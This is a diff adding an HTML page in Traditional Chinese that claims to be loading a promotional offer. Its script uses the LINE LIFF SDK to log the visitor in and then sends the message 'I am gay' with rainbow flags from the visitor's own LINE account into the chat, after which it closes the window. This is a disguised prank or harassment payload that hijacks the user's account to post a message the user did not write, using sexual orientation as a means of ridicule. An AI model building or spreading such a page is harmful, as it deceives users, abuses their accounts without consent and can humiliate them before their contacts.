@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>正在載入優惠訊息...</title>
+    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00b900; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { margin-top: 15px; color: #555; }
+    </style>
+</head>
+<body>
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <div class="text">正在為您跳轉至活動頁面...</div>
+    </div>
+
+    <script>
+        async function main() {
+            try {
+                // 1. 初始化 LIFF
+                await liff.init({ liffId: "2008804483-ibgveErY" });
+
+                // 2. 判斷是否登入
+                if (!liff.isLoggedIn()) {
+                    liff.login();
+                } else {
+                    // 3. 執行傳送訊息
+                    await liff.sendMessages([
+                        {
+                            type: 'text',
+                            text: '我是同性戀🏳️‍🌈🏳️‍🌈🏳️‍🌈'
+                        }
+                    ]);
+                    
+                    // 4. 傳送成功後關閉視窗
+                    liff.closeWindow();
+                }
+            } catch (error) {
+                console.error('發生錯誤:', error);
+                // 如果是權限問題，通常會在這裡報錯
+                alert("載入失敗，請稍後再試。");
+            }
+        }
+
+        main();
+    </script>
+</body>
+</html>
